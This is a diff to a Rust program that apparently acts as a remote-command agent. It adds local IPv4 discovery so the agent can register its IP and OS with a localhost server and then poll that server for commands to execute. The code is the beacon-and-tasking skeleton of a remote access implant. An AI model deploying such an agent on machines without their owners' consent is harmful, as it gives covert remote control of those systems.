@@ -10,18 +10,18 @@ use std::path::Path;
 use wait_timeout::ChildExt;
 use std::io::Read;
 
+use pnet_datalink::interfaces;
+
 const sleep_time: Duration = time::Duration::from_millis(5000);
 const server_ip: &str = "http://127.0.0.1:8080";
 
-fn initHost() -> Option<String>{
-    let mut ip = "";
+fn initHost(host_ip:&str) -> Option<String>{
+    let ip = host_ip;
     let mut os = "";
     if cfg!(windows) {
         os = "Windows";
-        ip = "10.1.1.10";
     } else if cfg!(unix) {
         os = "Linux";
-        ip = "10.1.1.92";
     }
     let text = format!("{{\"IP\": \"{}\", \"OS\": \"{}\"}}",ip,os);
     let client = reqwest::blocking::Client::new();
@@ -38,6 +38,25 @@ fn initHost() -> Option<String>{
     };
     return hostname;
 }
+
+//get IP address of interfaces
+fn get_local_ip() -> String {
+    let interfaces = interfaces();
+    let ip = "1.2.3.4"; //unknown address
+    for interface in interfaces {
+        if interface.is_loopback() {
+            continue;
+        }
+        for ip_addr in interface.ips {
+            let ip = format!("{}", ip_addr.ip());
+            if ip.contains(".") { //if it's an IPv4 address
+                return ip;
+            }
+        }
+    }
+    return ip.to_string();
+}
+
 
 fn getCommands(identifier:&str){
     let commands_url = format!("{}/hosts/{}/commands",server_ip,identifier);
@@ -56,7 +75,7 @@ fn getCommands(identifier:&str){
     let res = json::parse(&res).unwrap(); //always will receive json
     let command_count: i32 = format!("{}",res["command_count"]).parse().unwrap();
     if command_count == 69420{ //special number sent by server indicating there is an error
-        main_loop(&get_id());
+        main_loop(&get_id(&get_local_ip()));
     }
     let mut count = 1;
     if command_count == 0{
@@ -159,9 +178,9 @@ fn print(txt:&str){
     }
 }
 
-fn get_id() -> String {
+fn get_id(host_ip:&str) -> String {
     loop{
-        let identifier = match initHost(){
+        let identifier = match initHost(host_ip){
             Some(id)=>{
                 id
             }, None=>{
@@ -182,8 +201,9 @@ fn main_loop(identifier:&str) -> Result<String,String>{
 }
 
 fn main(){
+    let host_ip = get_local_ip();
     loop{
-        let identifier = get_id();
+        let identifier = get_id(&host_ip);
         match main_loop(&identifier){
             Ok(_)=>{
                 continue
